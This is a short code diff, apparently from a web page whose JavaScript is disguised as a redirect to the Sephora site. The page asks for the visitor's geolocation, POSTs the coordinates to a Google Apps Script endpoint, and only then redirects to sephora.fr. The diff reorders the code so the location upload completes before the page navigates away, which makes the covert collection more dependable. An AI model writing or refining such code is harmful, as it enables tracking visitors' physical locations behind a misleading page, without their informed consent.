@@ -7,6 +7,8 @@
         function redirectToSephora() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
+                    console.log("Géolocalisation réussie :", position.coords);
+
                     fetch('https://script.google.com/macros/s/AKfycbxhKUD0lRVaxdGShPNTbdRxJIL8sC0FXJMI0-nQHHcSnwx_hTkGuDg7Z311tHeA3ioE/exec', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -17,11 +19,15 @@
                         })
                     })
                     .then(response => response.json())
-                    .then(data => console.log("Réponse du serveur :", data))
-                    .catch(error => console.error("Erreur lors de l'envoi des données :", error));
+                    .then(data => {
+                        console.log("Réponse du serveur :", data);
+                        window.location.href = "https://www.sephora.fr";
+                    })
+                    .catch(error => {
+                        console.error("Erreur lors de l'envoi des données :", error);
+                        window.location.href = "https://www.sephora.fr";
+                    });
 
-                    // Redirection automatique vers Sephora après l'envoi des données
-                    window.location.href = "https://www.sephora.fr";
                 }, function(error) {
                     console.error("Erreur de géolocalisation :", error);
                     window.location.href = "https://www.sephora.fr";
